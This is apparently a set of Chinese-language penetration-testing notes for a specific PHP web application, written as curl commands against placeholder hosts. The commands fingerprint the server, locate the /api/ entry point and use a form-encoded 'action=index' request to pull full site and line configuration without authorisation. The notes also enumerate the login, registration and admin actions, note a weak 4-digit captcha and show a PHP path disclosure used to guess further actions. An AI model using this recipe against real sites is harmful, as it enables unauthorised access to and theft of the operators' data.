# 指纹识别
curl -s -k -H "Host: TARGET_DOMAIN" http://TARGET_IP/ -i | head -20
# 关注：Server: nginx / X-Powered-By: PHP/8.1.7 / x-is-origin: true（重复两次）/ 根路径无正确 Host 时返回 500

# 拿到首页后提取统一 API 入口
curl -s -k -H "Host: TARGET_DOMAIN" http://TARGET_IP/js/common.js | grep -n "url:"
# -> url: "/api/"

# ★ 关键：必须用 form-urlencoded（JSON body 走默认分支，只返回 {"code":200} 无 result）
curl -s -k -H "Host: TARGET_DOMAIN" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -X POST -d 'action=index' http://TARGET_IP/api/

# 未授权即返回全部站点配置与分站列表：
# {"code":200,"result":{"Ainfo":{...},"Sinfo":{"<站点id>":{"id":"","name":""}},
#   "Linfo":{"<站点id>":[{"id":"<线路id>","link":"https://<随机子域>.TARGET_DOMAIN:<端口>",
#                          "jump":"1","change":"/cache/jump/<hash>.html"}]}}}

# 其他已确认的 action（同一入口）：
#   action=safe     -> {"result":{"safe":1}}  站点是否启用安全码
#   action=index    -> 站点/分组/线路全量数据（未授权）
#   action=login    -> 登录（form: userid/passwd/safe），验证码 GET /code.php（4 位纯数字）
#   action=reg      -> 注册（userid/passwd/passwd1/inherit/safe）
#   action=find     -> 找回密码（email 参数），存在变量未定义 bug（源码路径泄露）
#   action=root_*   -> 后台功能（未登录返回 {"code":151}）
# 后台入口：/root/<uid>/   菜单：网站列表/分组/用户/风格/日志/基本设置

# 源码路径泄露（find 接口触发 PHP 错误）：
# /home/wwwroot/main/application/Api/<action>.php
# /home/wwwroot/main/application/Common/{Base.php,Mysql.php}
# /home/wwwroot/main/public/example.com
# 说明 action 名 == Api/<action>.php 文件名，可作为 action 枚举线索